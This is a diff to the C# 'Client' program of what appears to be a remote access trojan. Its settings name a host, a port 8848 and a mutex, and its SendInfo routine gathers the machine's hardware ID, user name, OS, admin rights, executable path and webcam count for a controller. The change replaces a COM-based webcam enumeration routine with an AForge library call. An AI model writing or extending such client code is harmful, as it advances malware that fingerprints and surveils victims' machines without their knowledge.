@@ -10,15 +10,13 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using System.Runtime.InteropServices.ComTypes;
-using EXCEPINFO = System.Runtime.InteropServices.ComTypes.EXCEPINFO;
-using DISPPARAMS = System.Runtime.InteropServices.ComTypes.DISPPARAMS;
 using System.Net;
 using System.Linq;
 using System.Reflection;
 using System.Windows.Forms;
 using Timer = System.Threading.Timer;
 using Microsoft.Win32;
+using AForge.Video.DirectShow;
 
 namespace Client
 {
@@ -26,7 +24,7 @@ namespace Client
     {
         #region Setting
         public static readonly string Link = null;
-        public static readonly string Host = "127.0.0.1";        
+        public static readonly string Host = "127.0.0.1";
         public static readonly int Port = 8848;
         public static readonly string Version = "0.0.1";
         public static readonly string Mutex = "qwqdanchun";
@@ -364,7 +362,7 @@ namespace Client
 
         #endregion
 
-        #region
+        #region SendInfo
 
         public static byte[] SendInfo()
         {
@@ -372,8 +370,8 @@ namespace Client
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID;
             msgpack.ForcePathObject("User").AsString = Environment.UserName;
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Environment.Is64BitOperatingSystem? "64bit":"32bit");
-            msgpack.ForcePathObject("Camera").SetAsBoolean(havecamera());
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Environment.Is64BitOperatingSystem ? "64bit" : "32bit");
+            msgpack.ForcePathObject("Camera").AsString = new FilterInfoCollection(FilterCategory.VideoInputDevice).Count.ToString();
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Version;
             msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
@@ -514,96 +512,6 @@ namespace Client
         }
         #endregion
 
-        #region Camera
-        public static bool havecamera()
-        {
-            string[] devices = FindDevices();
-            if (devices.Length == 0)
-            {
-                return false;
-            }
-            else
-            {
-                return true;
-            }
-        }
-
-        public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");
-        public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");
-        public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");
-        public static string[] FindDevices()
-        {
-            return GetFiltes(CLSID_VideoInputDeviceCategory).ToArray();
-        }
-
-        public static List<string> GetFiltes(Guid category)
-        {
-            var result = new List<string>();
-            EnumMonikers(category, (moniker, prop) =>
-            {
-                object value = null;
-                prop.Read("FriendlyName", ref value, 0);
-                var name = (string)value;
-                result.Add(name);
-                return false;
-            });
-
-            return result;
-        }
-
-
-        private static void EnumMonikers(Guid category, Func<IMoniker, IPropertyBag, bool> func)
-        {
-            IEnumMoniker enumerator = null;
-            ICreateDevEnum device = null;
-
-            try
-            {
-                device = (ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
-                device.CreateClassEnumerator(ref category, ref enumerator, 0);
-                if (enumerator == null) return;
-                var monikers = new IMoniker[1];
-                var fetched = IntPtr.Zero;
-
-                while (enumerator.Next(monikers.Length, monikers, fetched) == 0)
-                {
-                    var moniker = monikers[0];
-                    object value = null;
-                    Guid guid = IID_IPropertyBag;
-                    moniker.BindToStorage(null, null, ref guid, out value);
-                    var prop = (IPropertyBag)value;
-                    try
-                    {
-                        var rc = func(moniker, prop);
-                        if (rc == true) break;
-                    }
-                    finally
-                    {
-                        Marshal.ReleaseComObject(prop);
-                        if (moniker != null) Marshal.ReleaseComObject(moniker);
-                    }
-                }
-            }
-            finally
-            {
-                if (enumerator != null) Marshal.ReleaseComObject(enumerator);
-                if (device != null) Marshal.ReleaseComObject(device);
-            }
-        }
-        [ComVisible(true), ComImport(), Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        public interface ICreateDevEnum
-        {
-            int CreateClassEnumerator([In] ref Guid pType, [In, Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
-        }
-
-        [ComVisible(true), ComImport(), Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        public interface IPropertyBag
-        {
-            int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);
-            int Write(string PropName, ref object Var);
-        }
-        #endregion
-
         #endregion
 
 
@@ -626,7 +534,7 @@ namespace Client
             return newByte;
         }
 
-        
+
 
         #endregion
 
